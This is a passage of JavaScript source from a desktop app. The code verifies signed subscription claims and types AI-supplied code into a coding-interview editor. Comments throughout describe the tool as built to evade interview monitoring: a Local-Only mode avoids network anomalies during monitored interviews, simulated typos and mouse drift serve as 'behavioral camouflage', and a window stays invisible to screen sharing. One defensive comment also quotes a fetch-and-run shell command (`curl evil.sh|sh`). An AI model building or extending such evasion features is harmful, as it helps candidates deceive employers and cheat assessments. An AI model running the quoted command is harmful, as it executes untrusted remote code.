      key: Buffer.from(AT_ENTITLEMENT_PUBLIC_KEY_B64, 'base64'),
      format: 'der',
      type: 'spki',
    });
    // Buffer.from(..., 'base64') silently drops anything outside the
    // alphabet, so a mangled paste can still yield a DER blob that parses
    // into SOMETHING. Insist on the curve we are actually verifying against.
    _atClaimPublicKey = key.asymmetricKeyType === 'ed25519' ? key : null;
  } catch (_) {
    _atClaimPublicKey = null;
  }
  return _atClaimPublicKey;
}

// The verification. Returns the decoded claim object when the envelope is
// genuine, unexpired and belongs to `expectedSub`; otherwise null — which
// every caller reads as "we hold no signed claim", NOT as a denial. Never
// throws: this parses a file sitting on the user's own disk, so garbage in
// has to mean null out rather than an exception on the keystroke path.
//
// WHAT BYTES ARE CHECKED — the single most load-bearing detail in this file.
// The signature covers the ASCII characters of the base64url payload STRING
// exactly as transmitted, not the decoded object and not a re-encoding of
// it. JSON.stringify has no canonical key order across versions, languages,
// or a well-meaning refactor that reorders a literal, so a verifier that
// parses and re-serializes before checking is a verifier that fails at
// random. Check the characters we received; decode afterwards, only to READ.
function autoTypeVerifySignedClaim(envelope, expectedSub, nowMs) {
  try {
    if (!envelope || typeof envelope !== 'object') return null;
    // `alg` and `v` sit OUTSIDE the signature, so they prove nothing — they
    // only say whether this is a shape we understand. Pinning them means a
    // future envelope format lands as "no claim" (fall back to the probe)
    // instead of as a confident misparse.
    if (envelope.alg !== 'ed25519' || envelope.v !== 1) return null;
    const payloadB64 = envelope.payload;
    const sigB64 = envelope.sig;
    if (typeof payloadB64 !== 'string' || typeof sigB64 !== 'string') return null;
    // base64url decoding SILENTLY DISCARDS out-of-alphabet bytes, so a
    // truncated or hand-edited file would otherwise decode to a shorter but
    // perfectly valid-looking buffer. Insist on the exact charset first.
    if (!/^[A-Za-z0-9_-]+$/.test(payloadB64) || !/^[A-Za-z0-9_-]+$/.test(sigB64)) return null;
    const pub = autoTypeClaimPublicKey();
    if (!pub) return null;
    const sig = Buffer.from(sigB64, 'base64url');
    if (sig.length !== 64) return null;  // Ed25519 signatures are fixed-width
    // Ed25519 takes a NULL algorithm — the curve fixes its own hash (SHA-512,
    // internally, over the whole message). Passing 'sha256' here throws.
    if (!require('crypto').verify(null, Buffer.from(payloadB64, 'ascii'), pub, sig)) return null;
    const claim = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));
    if (!claim || typeof claim !== 'object') return null;
    // Payload version, this one INSIDE the signature. A bump means the
    // server changed what these fields mean, and the right response to that
    // is to stop trusting our reading of them and fall back to the probe —
    // not to guess.
    if (claim.v !== 1) return null;
    if (typeof claim.autoType !== 'boolean') return null;
    if (typeof claim.exp !== 'number' || !(claim.exp > nowMs)) return null;
    // Bind the claim to THIS account. Copying the file to another machine or
    // another login is the obvious next attack after editing it, and this is
    // what makes it worthless. expectedSub is null only when we cannot read
    // a user id at all (signed out, or a token that isn't a JWT) — see
    // autoTypeReadSignedClaim for why that case still honours a claim rather
    // than locking someone out mid-interview.
    if (expectedSub != null && String(claim.sub) !== String(expectedSub)) return null;
    return claim;
  } catch (_) {
    // Malformed JSON, a truncated file, an OpenSSL build without Ed25519 —
    // every one of them means "no signed claim", never a crash.
    return null;
  }
}

// The raw user id out of the JWT, unprefixed — which is what the claim's
// `sub` carries. Distinct from autoTypeIdentityKey above, which returns a
// namespaced CACHE key ('u:123', or a token fingerprint when the token
// isn't a JWT); neither of those forms is something a server would ever put
// in `sub`, so comparing against it would fail every claim.
function autoTypeTokenUserId(authToken) {
  if (!authToken) return null;
  try {
    const seg = String(authToken).split('.')[1];
    if (!seg) return null;
    const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
    const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
    if (id != null && String(id).length) return String(id);
  } catch (_) { /* not a JWT — there is no id to bind to */ }
  return null;
}

// Signed claims live in the SAME file as the unsigned grants, under their
// own `claims` map. One file, one read — and the existing reader already
// ignores unknown top-level keys, so a claim written by this build simply
// rides along beside the `entries` an older build would still understand.
function autoTypeClaimsOf(cache) {
  const claims = cache && cache.claims;
  return (claims && typeof claims === 'object') ? claims : {};
}

function autoTypeStoreSignedClaim(key, envelope) {
  if (!key || !envelope) return;
  try {
    const cache = autoTypeReadEntitlementCache();
    const claims = autoTypeClaimsOf(cache);
    // `at` is our local wall-clock and is OUTSIDE the signature on purpose.
    // It is used for exactly one thing — deciding how stale a DENIAL is —
    // and it can never grant access, so editing it buys an attacker nothing.
    claims[key] = {
      payload: envelope.payload,
      sig: envelope.sig,
      alg: envelope.alg,
      v: envelope.v,
      at: Date.now(),
    };
    // Same bound as the unsigned entries: nobody signs into more than a
    // handful of accounts on one machine, and an unbounded map is a slow
    // disk leak.
    const keys = Object.keys(claims);
    if (keys.length > 8) {
      keys.sort((a, b) => (claims[a].at || 0) - (claims[b].at || 0));
      for (const k of keys.slice(0, keys.length - 8)) delete claims[k];
    }
    cache.claims = claims;
    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
  } catch (e) {
    // Best-effort, exactly like the unsigned cache: a machine that cannot
    // write here just re-verifies online, which is inconvenient, never
    // unsafe.
    console.warn('[auto-type] could not persist signed entitlement claim:', e && e.message);
  }
}

// Drop a signed claim outright. Deliberately SEPARATE from
// autoTypeForgetEntitlement: the signed-denial path below drops the unsigned
// grant and must KEEP the signed denial (that denial is the record — it is
// the thing making the downgrade stick), whereas an explicit 402/403 from a
// live route means whatever claim we hold has been overtaken by events.
function autoTypeForgetSignedClaim(key) {
  if (!key) return;
  try {
    const cache = autoTypeReadEntitlementCache();
    const claims = autoTypeClaimsOf(cache);
    if (claims[key]) {
      delete claims[key];
      cache.claims = claims;
      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
    }
  } catch (_) { /* best-effort */ }
}

// The read side. Returns { claim, key, storedAt } for a claim that verifies
// right now, or null. Note that verification happens on EVERY read, not once
// at write time: the file lives on the user's own disk, so "it verified when
// we stored it" says nothing about what is in it a minute later.
function autoTypeReadSignedClaim(authToken) {
  try {
    const sub = autoTypeTokenUserId(authToken);
    const key = autoTypeIdentityKey(authToken);
    const cache = autoTypeReadEntitlementCache();
    const claims = autoTypeClaimsOf(cache);
    const now = Date.now();
    if (key) {
      const env = claims[key];
      if (!env) return null;
      const claim = autoTypeVerifySignedClaim(env, sub, now);
      if (!claim) return null;
      return { claim, key, storedAt: typeof env.at === 'number' ? env.at : 0 };
    }
    // No key at all — signed out, or a token we cannot read an id from. We
    // still honour a claim that VERIFIES and has not expired: it is
    // server-signed proof that this installation was entitled inside the
    // claim's lifetime, the same property autoTypeCachedEntitlement asserts
    // in this case, except this one cannot be written by hand. Refusing here
    // would lock out the user whose token vanished mid-interview, which is
    // the exact failure the whole grace mechanism exists to prevent. Only
    // ALLOWs are honoured on this path — a denial minted for some other
    // account must never deny the person sitting here.
    for (const [k, env] of Object.entries(claims)) {
      const claim = autoTypeVerifySignedClaim(env, null, now);
      if (claim && claim.autoType === true) {
        return { claim, key: k, storedAt: typeof env.at === 'number' ? env.at : 0 };
      }
    }
    return null;
  } catch (_) {
    return null;
  }
}

// ── Keeping the claim warm ──
// How long a fetched claim is left alone. The claim is good for seven days,
// so refreshing on every cold launch would be six days of requests that
// change nothing — we only go back inside the last day of its life.
const AT_CLAIM_REFRESH_MARGIN_MS = 24 * 60 * 60 * 1000;
// A DENIAL is re-checked far more eagerly than a grant, and the asymmetry is
// the whole point: a stale grant costs us at most a week of a feature
// somebody stopped paying for, while a stale denial costs a user who paid
// five minutes ago and is being told no. An hour is short enough that
// "upgrade, then use it" works without a reinstall.
const AT_CLAIM_DENIAL_RECHECK_MS = 60 * 60 * 1000;
// First refresh well after launch. The app is painting, restoring sessions
// and running an update check; this is the least urgent network call in the
// process and it gets the last slot. The later entries cover the renderer
// still loading at 20s and the user signing in a few minutes into the
// session — see autoTypeStartEntitlementRefresh for why one shot isn't
// enough.
const AT_CLAIM_STARTUP_DELAYS_MS = [20 * 1000, 2 * 60 * 1000, 10 * 60 * 1000, 30 * 60 * 1000];
const AT_CLAIM_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
// The claim endpoint is one database read and one signature — no model call,
// nothing to wait on. A missed refresh is a non-event, so the timeout is
// short on purpose.
const AT_CLAIM_FETCH_TIMEOUT_MS = 6000;

async function autoTypeFetchSignedClaim(authToken) {
  const controller = new AbortController();
  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_CLAIM_FETCH_TIMEOUT_MS);
  try {
    const res = await fetch(`${API_BASE}/api/v1/license/entitlements`, {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${authToken}`,
        'Accept': 'application/json',
      },
      signal: controller.signal,
    });
    if (res.status !== 200) {
      // 501 means the server has no signing key configured yet, and it is
      // the only non-200 worth naming: it says "fall back to the unsigned
      // probe", not "this user is unentitled". 401 / 404 / 429 / 5xx all
      // collapse to the same thing here — we learned nothing, so we keep
      // whatever claim we already hold. Drain the tiny body so the socket
      // goes back to the pool instead of waiting on GC.
      try { await res.text(); } catch (_) {}
      return { status: res.status };
    }
    const body = await res.json();
    return { status: 200, envelope: body };
  } catch (e) {
    return { status: 0, error: e && e.message ? e.message : String(e) };
  } finally {
    clearTimeout(timer);
  }
}

function autoTypeClaimNeedsRefresh(authToken) {
  const signed = autoTypeReadSignedClaim(authToken);
  if (!signed) return true;
  if (signed.claim.autoType !== true) {
    return (Date.now() - (signed.storedAt || 0)) > AT_CLAIM_DENIAL_RECHECK_MS;
  }
  return (signed.claim.exp - Date.now()) < AT_CLAIM_REFRESH_MARGIN_MS;
}

// Fetch + verify + store. Returns a promise that ALWAYS resolves — callers
// are timers and startup hooks with nobody watching, and an unhandled
// rejection in the main process is a native error dialog on top of whatever
// the user was doing.
async function autoTypeRefreshSignedClaim(authToken, reason) {
  try {
    if (!authToken) return false;
    // Never mid-interview. A background HTTPS call to a licensing domain
    // forty minutes into a monitored screen-share is precisely the anomaly
    // Local-Only mode exists to avoid, and nothing here is urgent enough to
    // be worth it — the claim lasts a week and the next tick is hours away,
    // long after the session ends. Same sessionActive gate the updater and
    // the tray notifications use.
    if (sessionActive) return false;
    if (!autoTypeClaimNeedsRefresh(authToken)) return false;
    const key = autoTypeIdentityKey(authToken);
    if (!key) return false;
    const res = await autoTypeFetchSignedClaim(authToken);
    if (res.status !== 200 || !res.envelope) {
      console.log(`[auto-type] entitlement claim refresh (${reason}): nothing learned (${res.status === 501 ? 'server has no signing key yet — unsigned probe still in charge' : (res.status ? 'HTTP ' + res.status : res.error || 'network error')})`);
      return false;
    }
    const claim = autoTypeVerifySignedClaim(res.envelope, autoTypeTokenUserId(authToken), Date.now());
    if (!claim) {
      // A 200 that does not verify is not a mild problem — it is a rotated
      // key pair, the wrong API base, or something on the wire rewriting our
      // responses. Never store it, and say so loudly enough to debug from a
      // user's log.
      console.warn('[auto-type] entitlement claim refresh: server returned a claim that did NOT verify against the shipped public key — ignoring it');
      return false;
    }
    autoTypeStoreSignedClaim(key, res.envelope);
    console.log(`[auto-type] entitlement claim refreshed (${reason}): autoType=${claim.autoType} tier=${claim.tier} valid ${Math.round((claim.exp - Date.now()) / 3600000)}h`);
    return true;
  } catch (e) {
    console.warn('[auto-type] entitlement claim refresh threw:', e && e.message);
    return false;
  }
}

// The token, in MEMORY ONLY — main has never persisted one (see the note on
// payload.authToken in the handler) and must not start. This is a warm copy
// of the last token a legitimate Auto-Type run handed us, so a refresh can
// still happen when the renderer isn't in a state to be asked.
let autoTypeKnownToken = null;
function autoTypeRememberToken(authToken) {
  if (typeof authToken === 'string' && authToken.length > 20) autoTypeKnownToken = authToken;
}

// Main PULLS the token; the renderer never pushes it. That direction is the
// entire point — a refresh the renderer triggers is a refresh an attacker in
// the renderer controls, and "the renderer says so" is the trust boundary
// this work exists to remove. Reading localStorage off the page is not an
// escalation: it is the same string the renderer already hands us on every
// Auto-Type run, and a forged one buys nothing, because what we believe at
// the end is the server's signature, not the token.
async function autoTypeDiscoverToken() {
  try {
    const wc = mainWindow && !mainWindow.isDestroyed() ? mainWindow.webContents : null;
    if (wc && !wc.isDestroyed() && !wc.isLoading()) {
      const t = await wc.executeJavaScript(
        "(() => { try { return localStorage.getItem('minicaai_token'); } catch (e) { return null; } })()"
      );
      if (typeof t === 'string' && t.length > 20) return t;
    }
  } catch (_) { /* window gone, page mid-navigation, renderer crashed — fine */ }
  return autoTypeKnownToken;
}

// ── FIX for the user who has never been online ──
// The probe only ever ran when Auto-Type was FIRST USED, so somebody who
// bought Ultra, installed, turned Local-Only on and walked into an interview
// got refused at the worst possible moment. Refreshing in the background
// means any Ultra user who has EVER launched this app with a connection is
// already carrying a signed claim by the time they need it.
let autoTypeClaimRefreshTimer = null;
function autoTypeStartEntitlementRefresh() {
  // Idempotent: createMainWindow runs again on tray-restore and on macOS
  // 'activate', and a second interval here would stack forever.
  if (autoTypeClaimRefreshTimer) return;
  const tick = async (reason) => {
    try {
      if (sessionActive) return;
      const token = await autoTypeDiscoverToken();
      if (!token) return;
      await autoTypeRefreshSignedClaim(token, reason);
    } catch (_) { /* nothing on this path is allowed to matter */ }
  };
  // Several early attempts, not one. A single 20-second shot misses the two
  // commonest cold-start shapes: the renderer is still loading (no token to
  // read yet), and the user signs in a couple of minutes AFTER launch — and
  // missing either would park the next attempt six hours away, which on
  // install-day is precisely the person this fix exists for. Retries are
  // free once a claim lands: autoTypeClaimNeedsRefresh short-circuits on a
  // local file read and never touches the network again.
  //
  // .catch() on a promise that already cannot reject is belt-and-suspenders,
  // and cheap next to what an unhandled rejection looks like in main.
  for (const delay of AT_CLAIM_STARTUP_DELAYS_MS) {
    setTimeout(() => { tick('startup').catch(() => {}); }, delay);
  }
  autoTypeClaimRefreshTimer = setInterval(() => { tick('periodic').catch(() => {}); }, AT_CLAIM_REFRESH_INTERVAL_MS);
}

// The probe itself. Returns { status } — status 0 means we never got an
// answer (network error / timeout), which is explicitly NOT a denial.
async function autoTypeProbeEntitlement(authToken) {
  const controller = new AbortController();
  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_ENTITLEMENT_PROBE_TIMEOUT_MS);
  try {
    const res = await fetch(`${API_BASE}/api/v1/ai/autotype-plan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`,
        // Marks these in the server log as what they are — a gate check,
        // not a planner call that mysteriously forgot to send code.
        'X-Autotype-Entitlement-Probe': '1',
      },
      body: JSON.stringify({ entitlementProbe: true }),
      signal: controller.signal,
    });
    // Drain the (tiny) body so the socket goes back to the pool instead of
    // waiting on GC.
    try { await res.text(); } catch (_) {}
    return { status: res.status };
  } catch (e) {
    return { status: 0, error: e && e.message ? e.message : String(e) };
  } finally {
    clearTimeout(timer);
  }
}

// The decision. Never throws and never rejects: the caller fires this off
// next to a countdown the user can cancel, and a dangling rejected promise
// there would be an unhandled rejection on a perfectly normal abort.
async function autoTypeVerifyEntitlement({ authToken, localOnly }) {
  let key = null;
  let cached = null;
  // Set when a valid signed denial was seen and we fell through to the live
  // probe anyway. It means "the last thing the server told us was no", which
  // is the tie-breaker if the probe then fails to tell us anything.
  let signedDenial = false;
  try {
    key = autoTypeIdentityKey(authToken);
    cached = autoTypeCachedEntitlement(key);
    // Keep a warm copy for the background refresher. This is the one hook
    // that already exists for main to learn a token, so we use it rather
    // than adding an IPC channel the renderer would have to call — a
    // renderer-driven refresh is exactly the trust boundary being removed.
    autoTypeRememberToken(authToken);

    // ── The signed claim outranks everything below it ──
    // In BOTH directions, and before the localOnly branch on purpose: a
    // verified claim is the only artefact in this system the user cannot
    // write for themselves, and checking it needs no network — which is
    // precisely what Local-Only mode and hotel wifi need. Once one has ever
    // been seen, the unsigned grant underneath is a compatibility fallback
    // for servers that have no signing key yet, nothing more.
    const signed = autoTypeReadSignedClaim(authToken);
    if (signed && signed.claim.autoType === true) {
      return {
        allowed: true,
        source: localOnly ? 'signed-claim-local-only' : 'signed-claim',
        tier: signed.claim.tier || null,
        expiresInMs: signed.claim.exp - Date.now(),
      };
    }
    if (signed && signed.claim.autoType === false) {
      // A SIGNED denial is authoritative in a way a 403 never is: a 403 could
      // equally be an expired token or a server having a bad day, which is
      // why the endpoint answers 200 with autoType:false instead of a status
      // code. This is what makes a downgrade stop working promptly — drop the
      // older unsigned grant so its seven-day window cannot outlive the
      // subscription. The signed denial itself STAYS (it is the record).
      autoTypeForgetEntitlement(key);
      cached = null;   // dropped above; must not resurface on the degraded path
      signedDenial = true;
      // But a denial is a snapshot, and the person most likely to hit it is
      // the person who just paid to make it false. Offline we have no way to
      // know, so the denial stands. ONLINE we do: fall through to the live
      // probe, which answers the current question rather than the one we
      // cached up to an hour ago. It cuts both ways and that is the point —
      // a downgraded account gets 403 from the same probe. Local-Only still
      // returns here, because there the whole point is that no call happens.
      if (localOnly || !authToken) {
        return {
          allowed: false,
          reason: 'entitlement_denied',
          source: 'signed-claim',
          message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
        };
      }
    }

    // Local-Only mode suppresses the network call BY DESIGN — see the
    // localOnly comment at the top of the handler; on a monitored network
    // the Railway call is itself the anomaly. So local-only runs on the
    // cache alone, and a device that has never been verified is refused
    // with something the user can actually act on.
    if (localOnly) {
      if (cached) return { allowed: true, source: 'cache-local-only', ageMs: cached.ageMs };
      return {
        allowed: false,
        reason: 'entitlement_unverified',
        message: 'Auto-Type needs a one-time online check. Turn Local-Only Auto-Type off once (or reconnect), run Auto-Type, and it will keep working offline for the next 7 days.',
      };
    }

    // No token at all — nothing to probe with. Same rule as a network
    // failure: fall back to the cache, refuse if there isn't one.
    if (!authToken) {
      if (cached) return { allowed: true, source: 'cache-no-token', ageMs: cached.ageMs };
      return {
        allowed: false,
        reason: 'entitlement_signed_out',
        message: 'Auto-Type is an Ultra feature — sign in so we can verify your plan.',
      };
    }

    const probe = await autoTypeProbeEntitlement(authToken);
    const status = probe.status;

    if (status === 401) {
      // Expired / revoked session. Not a tier verdict, so we deliberately do
      // NOT drop the cached grant — this user may be Ultra with a stale
      // token, and punishing them here would lock them out offline later.
      return {
        allowed: false,
        reason: 'entitlement_signed_out',
        message: 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.',
        status,
      };
    }
    if (status === 403 || status === 402) {
      autoTypeForgetEntitlement(key);
      // We only reach the probe when no signed claim was usable, so there is
      // usually nothing to drop here — but an expired or wrong-`sub` claim
      // could still be sitting in the file, and a live tier denial is proof
      // it is worthless. Clearing it keeps the file honest.
      autoTypeForgetSignedClaim(key);
      return {
        allowed: false,
        reason: 'entitlement_denied',
        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
        status,
      };
    }
    if ((status >= 200 && status < 300) || status === 400 || status === 422) {
      autoTypeRememberEntitlement(key);
      // The live server just contradicted a signed denial we were holding —
      // they upgraded. Replace the stale claim now rather than letting the
      // hourly tick do it, so the NEXT run (which may be offline, or
      // Local-Only) already has a signed allow to read. Fire-and-forget: the
      // probe already answered this run, so nothing waits on it, and its own
      // sessionActive gate still applies.
      if (signedDenial) {
        Promise.resolve(autoTypeRefreshSignedClaim(authToken, 'denial-overturned')).catch(() => {});
      }
      return { allowed: true, source: 'server', status };
    }

    // 404 (server predates the route), 429, 5xx, or status 0 (network /
    // timeout). We learned nothing, so this is a grace-window question.
    // Unless we were holding a signed denial: then the last thing the server
    // actually said was no, and "we couldn't reach it" is not a reason to
    // overturn that. Deny, and say why — the message has to be the denial,
    // not the never-verified copy below, or someone who genuinely is not on
    // Ultra gets told to check their connection.
    if (signedDenial) {
      return {
        allowed: false,
        reason: 'entitlement_denied',
        source: 'signed-claim',
        status,
        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
      };
    }
    if (cached) return { allowed: true, source: 'cache-degraded', ageMs: cached.ageMs, status };
    return {
      allowed: false,
      reason: 'entitlement_unverified',
      message: `Auto-Type could not reach the licensing server (${status ? 'HTTP ' + status : (probe.error || 'network error')}), and this device has never completed an online Ultra check. Connect once and try again.`,
      status,
    };
  } catch (e) {
    // A bug in the check must not become a keystroke. Degrade to the same
    // rule as a network failure: cache or refuse.
    console.warn('[auto-type] entitlement check threw:', e && e.message);
    if (cached) return { allowed: true, source: 'cache-check-threw', ageMs: cached.ageMs };
    return {
      allowed: false,
      reason: 'entitlement_unverified',
      message: 'Auto-Type could not verify your plan on this device. Connect to the internet once and try again.',
    };
  }
}

ipcMain.handle('auto-type:send', async (event, payload) => {
  console.log(`[auto-type] IPC received: payload.code=${payload && payload.code ? payload.code.length : 0} bytes, lang=${payload && payload.language || '?'}, skipLines=${payload && payload.skipLines || 0}`);
  const code = payload && typeof payload.code === 'string' ? payload.code : '';
  // skipLines lets the renderer (which ran OCR on the target editor) tell us
  // how many leading lines of `code` are already present on screen, so we
  // start typing from where the new content actually begins instead of
  // duplicating boilerplate.
  const rawSkip = payload && typeof payload.skipLines === 'number' ? payload.skipLines : 0;
  const skipLines = Number.isInteger(rawSkip) && rawSkip > 0 ? rawSkip : 0;
  // Auth token for the Haiku planner Railway call. Renderer reads it from
  // licenseService.getToken() and passes through; main never persists it.
  const authToken = payload && typeof payload.authToken === 'string' ? payload.authToken : '';
  const language = payload && typeof payload.language === 'string' ? payload.language : 'unknown';
  // Local-only mode (set from renderer settings). When true, the Haiku
  // planner Railway call is suppressed — typing runs entirely on-device
  // using the deterministic UIA planner only. Targets monitored networks
  // where outbound traffic to a Railway domain mid-interview is itself
  // an anomaly. Defaults to false (cloud planner allowed) for backwards
  // compat — old renderers that don't send the field get the prior behavior.
  const localOnly = !!(payload && payload.localOnly === true);
  // Persistent run log: every auto-type call gets a unique runId and is
  // captured to .autotype-plans.jsonl with intended code, planner ops,
  // before/after snapshots, and verify result. Survives Electron restarts.
  // "show me what the planner thought" is now a one-line tail of that file.
  const _atRunId = autoTypePlanLog.newRunId();
  autoTypePlanLog.begin(_atRunId);
  autoTypeCurrentRunId = _atRunId;   // lets autoTypeBroadcast persist verify outcomes
  autoTypePlanLog.record(_atRunId, { language, intendedCode: code, skipLines, localOnly });
  // P8-1: pin the owning CodeBlock's ID so broadcasts can be addressed.
  const blockId = payload && typeof payload.blockId === 'string' ? payload.blockId : null;
  // ── Gate 0: who asked? ──
  // First gate on purpose, so an untrusted sender gets the same answer no
  // matter what state the engine is in. Anything that can run script in a
  // renderer — a markdown/chat XSS, a compromised npm dependency, embedded
  // content in a subframe — could otherwise ask us to type `curl evil.sh|sh`
  // into whatever terminal the user alt-tabbed to, and we would hide our
  // own window first so they never saw it happen.
  if (!autoTypeSenderIsTrusted(event)) {
    console.error('[auto-type] REFUSED: invoke did not come from the top frame of a window we own — keystroke injection blocked.');
    autoTypePlanLog.record(_atRunId, { earlyBail: 'untrusted_sender' });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    return { error: 'Auto-Type refused: that request did not come from the app window.' };
  }
  if (autoTypeInFlight) {
    autoTypePlanLog.record(_atRunId, { earlyBail: 'already_in_progress' });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    return { error: 'Auto-Type already in progress.' };
  }
  if (!code.length) {
    autoTypePlanLog.record(_atRunId, { earlyBail: 'empty_code' });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    return { error: 'Nothing to type.' };
  }
  // ── Gate 1: how much? ──
  // payload.code arrived as an arbitrary-length string. The cap is not about
  // sane files (a 500-line source file is ~15 KB) — it is about the fact
  // that a keystroke stream with no end is one the user cannot get ahead of.
  const codeBytes = Buffer.byteLength(code, 'utf8');
  if (codeBytes > AT_MAX_CODE_BYTES) {
    console.error(`[auto-type] REFUSED: code is ${codeBytes} bytes, over the ${AT_MAX_CODE_BYTES}-byte cap.`);
    autoTypePlanLog.record(_atRunId, { earlyBail: 'code_too_large', codeBytes });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    return { error: `Auto-Type refused: ${Math.round(codeBytes / 1024)} KB is far too much to type (limit ${Math.round(AT_MAX_CODE_BYTES / 1024)} KB).` };
  }

  autoTypeInFlight = true;
  autoTypeAbort = false;
  autoTypeAbortReason = null;
  autoTypeAbortDiagnostic = null;
  _atCurrentBlockId = blockId;
  autoTypeArmAbortSignal();  // P8.5: prime the cancel-signal for this cycle
  autoTypeResetCadence();
  autoTypeResetMouseTwitch();
  _atLastWasTypo = false;

  // Pull mouse alongside keyboard + Key — needed for the periodic
  // pointer-drift realism (autoTypeMaybeMouseTwitch). nut-js exposes
  // mouse as a singleton on the same module. If it's missing on this
  // nut-js build we continue without twitches — the typing run still
  // works, just without that layer of behavioral camouflage.
  let keyboard, Key, mouse;
  try {
    const nut = loadNut();
    keyboard = nut.keyboard;
    Key = nut.Key;
    mouse = nut.mouse || null;
  } catch (e) {
    autoTypeInFlight = false;
    // L21: this early return used to walk away from an open _pending entry.
    autoTypePlanLog.record(_atRunId, { earlyBail: 'native_module_load_failed', error: e && e.message });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    console.error('[auto-type] native module load failed:', e && e.message);
    return { error: 'Native input module failed to load: ' + (e && e.message) };
  }

  // ── Gate 2: did they pay? (fired now, decided before we hide) ──
  // Started HERE rather than awaited here so the round-trip hides behind the
  // 3-second countdown the user is already watching — on a normal run it
  // costs zero visible time. But the DECISION is taken below, before
  // mainWindow.hide() and long before any keystroke: a refused run must
  // never leave the user staring at a vanished app mid-interview, and it
  // must never put a single character into someone else's window.
  // autoTypeVerifyEntitlement never rejects, so the abort path below can
  // walk away from this promise without an unhandled rejection.
  const entitlementCheck = autoTypeVerifyEntitlement({ authToken, localOnly });

  // Phase 1: countdown. Windows stay visible so the user can see the
  // timer and alt-tab to the target editor (or click to cancel).
  for (let n = 3; n > 0 && !autoTypeAbort; n--) {
    autoTypeBroadcast({ phase: 'countdown', n });
    await autoTypeSleep(1000);
  }
  if (autoTypeAbort) {
    autoTypeInFlight = false;
    // L21: ditto — the user-cancel path leaked its _pending entry too.
    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_during_countdown', aborted: true });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    autoTypeBroadcast({ phase: 'done', aborted: true });
    return { aborted: true };
  }

  // The entitlement verdict. Nothing has been hidden yet and nothing has
  // been typed, so a refusal here is clean: log it, tell the user something
  // they can act on, and leave the desktop exactly as we found it.
  const entitlement = await entitlementCheck;
  if (!entitlement.allowed) {
    console.warn(`[auto-type] REFUSED by entitlement gate (${entitlement.reason}, status=${entitlement.status || 'n/a'}) — no window hidden, no keystrokes emitted.`);
    autoTypePlanLog.record(_atRunId, {
      earlyBail: entitlement.reason,
      entitlement: { reason: entitlement.reason, status: entitlement.status || null, localOnly },
    });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    autoTypeAbort = true;
    autoTypeAbortReason = entitlement.reason;
    autoTypeAbortDiagnostic = { hint: entitlement.message };
    autoTypeInFlight = false;
    autoTypeBroadcast({
      phase: 'done',
      aborted: true,
      reason: entitlement.reason,
      hint: entitlement.message,
    });
    return { aborted: true, reason: entitlement.reason };
  }
  console.log(`[auto-type] entitlement OK (source=${entitlement.source}${entitlement.status ? ', HTTP ' + entitlement.status : ''}${typeof entitlement.ageMs === 'number' ? ', cached ' + Math.round(entitlement.ageMs / 3600000) + 'h ago' : ''})`);

  // Phase 2: hide the main window so the user can see the target editor
  // underneath. We DO NOT hide the popout — it has setContentProtection
  // (invisible to screen share), its screen-saver-level alwaysOnTop is
  // z-order only (not focus-stealing), and hide/show cycles the popout's
  // Chromium visibility state which breaks the existing auto-scroll RAF
  // chain (document becomes hidden → rAF pauses → scroll state desyncs
  // on re-show). Keystrokes already reach HackerRank/etc. because the
  // user alt-tabbed during countdown; the popout being visible on top
  // just means the user can watch typing happen.
  const restore = [];
  if (mainWindow && !mainWindow.isDestroyed() && mainWindow.isVisible()) {
    // showInactive (not show) on restore: bring the window back where it
    // was, but DO NOT steal focus from the editor. show() activates the
    // window and yanks it to the front — right after typing finishes,
    // that means focus snaps off the editor (where the user wants to
    // immediately run/review the typed code) onto our app. The hide-
    // during-typing intent ("let the user see the editor") was correct;
    // the post-typing "give the user their app back" is fine, but doing
    // it without hijacking focus respects what the user is about to do.
    restore.push(() => { if (mainWindow && !mainWindow.isDestroyed()) mainWindow.showInactive(); });
    mainWindow.hide();
  }
  // If the popout itself is focused (user just clicked Auto-Type inside it),
  // blur it so typing doesn't go back into the popout's own input.
  if (popoutWindow && !popoutWindow.isDestroyed() && popoutWindow.isFocused()) {
    popoutWindow.blur();
  }
  // Small delay for the OS to settle focus on the editor underneath.
  await autoTypeNavSleep(120, 200);

  // ── A11Y (UIA) primary read ──
  // Ask the OS accessibility API what text is in the focused editor and
  // where the cursor is. This supersedes the renderer's OCR guess when
  // available: UIA sees exact text (not a fuzzy OCR of it) and the exact
  // cursor offset, so `skipLines` becomes deterministic instead of
  // levenshtein-fuzzy. On non-Windows or UIA-blind targets, we keep
  // whatever `skipLines` the renderer sent from its OCR pass.
  let effectiveSkipLines = skipLines;
  let effectiveSkipTrailing = 0;
  let wipeFirstLine = false;
  let uiaSnapshotBefore = null;
  let usedUIA = false;
  try {
    // Generous budget for the pre-type read. Bridge is normally pre-warmed
    // at app-ready, but if the user hits Auto-Type within seconds of boot
